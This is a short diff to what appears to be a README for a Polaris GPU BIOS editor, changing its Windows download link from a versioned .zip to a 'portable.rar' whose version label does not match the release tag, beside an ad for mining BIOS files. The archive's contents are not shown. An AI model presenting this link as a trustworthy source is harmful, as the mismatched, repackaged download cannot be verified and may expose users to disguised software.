@@ -3,7 +3,7 @@
 -----------------------------------------------------------------------------------------------------------------
 ![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
 
-[Download PolarisBiosEditor v1.7.6 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor1.7.6.zip)
+[Download Polaris Bios Editor (PBE 1.6.7-3PRO) for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor-portable.rar)
 -----------------------------------------------------------------------------------------------------------------
 
 ## Buy mining bios with performance timings! https://mining-bios.eu/
